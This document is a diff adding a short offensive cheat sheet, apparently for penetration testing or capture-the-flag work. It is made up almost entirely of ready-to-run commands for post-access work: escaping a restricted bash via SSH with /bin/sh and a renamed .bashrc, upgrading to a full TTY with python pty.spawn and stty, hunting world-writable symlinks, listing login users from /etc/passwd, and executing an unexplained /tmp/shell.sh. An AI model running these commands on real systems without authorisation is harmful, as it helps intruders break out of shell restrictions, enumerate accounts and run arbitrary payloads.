@@ -1,0 +1,49 @@
+-------------------------------------------------------------
+                    TTY Breakout Reference
+-------------------------------------------------------------
+
+# If BASH is blocked
+# Check the 'env' variable!
+# Reminder: Linux defaults to /bin/bash with a default bashrc if no ~/.bashrc exists.
+
+# Step 1: Basic shell access
+ssh neo@127.0.0.1 "/bin/sh"
+cd \$HOME
+mv .bashrc .bashrc.BAK
+exit
+ssh neo@127.0.0.1
+
+-------------------------------------------------------------
+                   TTY Upgrade Techniques
+-------------------------------------------------------------
+
+python -c 'import pty; pty.spawn("/bin/bash")'
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+
+export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/tmp
+export TERM=xterm-256color
+alias ll='ls -lsaht --color=auto'
+
+# Keyboard Shortcut:
+# Ctrl + Z (Background Process)
+stty raw -echo; fg; reset
+stty columns 200 rows 200
+
+-------------------------------------------------------------
+               Post-Breakout Reconnaissance
+-------------------------------------------------------------
+
+# Find world-writable symlinks
+find / -perm -2 -type l -ls 2>/dev/null | sort -r
+
+# List users with valid shells
+grep -vE "nologin|false" /etc/passwd
+
+-------------------------------------------------------------
+                    Miscellaneous Commands
+-------------------------------------------------------------
+
+chmod u+x /tmp/shell.sh
+/tmp/shell.sh
+
+-------------------------------------------------------------
